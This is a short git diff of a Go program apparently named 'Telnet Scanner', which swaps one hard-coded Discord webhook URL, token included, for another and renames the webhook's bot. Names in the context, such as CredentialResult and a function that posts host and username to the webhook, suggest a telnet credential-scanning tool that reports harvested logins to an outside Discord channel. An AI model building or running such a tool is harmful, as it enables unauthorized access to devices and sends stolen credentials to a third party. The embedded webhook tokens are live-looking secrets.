@@ -72,7 +72,7 @@ const (
 	STATS_INTERVAL  = 1 * time.Second
 	MAX_QUEUE_SIZE  = 100000
 	CONNECT_TIMEOUT = 1 * time.Second
-	DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1404454771104153741/QbyVNwSnXo7LzTabfyGB1jG3Yq-Ff9ZE9QdPvk0T5mvb8kGFy0FnZfhYMx6u-Eev3ZFK" // ganti
+	DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1404413745144529007/AhSRL7Nv3reZb8st4A220S_SDCpaoDDZs7kwoP1xxUTtq_iL-emNgCBG9HgECQkgSss3" // ganti
 )
 
 type CredentialResult struct {
@@ -371,7 +371,7 @@ func sendDiscordWebhookWithFileGeneric(title string, color int, host, username, 
 		},
 	}
 	payloadStruct := DiscordWebhook{
-		Username:  "Telnet Scanner",
+		Username:  "[ 2 ] TELNET SCANNER",
 		AvatarURL: "https://media.tenor.com/pdX9YTI4_eoAAAAM/cat-cat-with-tongue.gif",
 		Embeds:    []DiscordEmbed{embed},
 	}
